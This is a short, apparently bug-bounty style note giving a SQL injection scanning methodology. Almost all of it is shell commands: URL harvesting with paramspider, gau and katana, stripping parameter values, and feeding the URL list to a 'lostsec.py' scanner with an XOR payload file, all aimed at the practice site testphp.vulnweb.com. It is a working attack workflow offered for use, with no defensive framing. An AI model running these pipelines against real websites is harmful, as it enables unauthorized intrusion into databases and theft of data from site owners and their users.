BEST SQLI METHODLOGY BY ME:

for single url:

python3 lostsec.py -u "http://testphp.vulnweb.com/artists.php?artist="  -p payloads/xor.txt -t 5

for multiple urls:

paramspider -d testphp.vulnweb.com -o urls.txt

cat output/urls.txt | sed 's/FUZZ//g' >final.txt

python3 lostsec.py -l final.txt -p payloads/xor.txt -t 5

echo testphp.vulnweb.com | gau --mc 200 | urldedupe >urls.txt

cat urls.txt | grep -E "\.php|\.asp|\.aspx|\.cfm|\.jsp" | grep '=' | sort > output.txt

cat output.txt | sed 's/=.*/=/' >final.txt

python3 lostsec.py -l final.txt -p payloads/xor.txt -t 5

echo testphp.vulnweb.com | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | urldedupe >output.txt

katana -u http://testphp.vulnweb.com -d 5 | grep '=' | urldedupe | anew output.txt

cat output.txt | sed 's/=.*/=/' >final.txt

python3 lostsec.py -l final.txt -p payloads/xor.txt -t 5
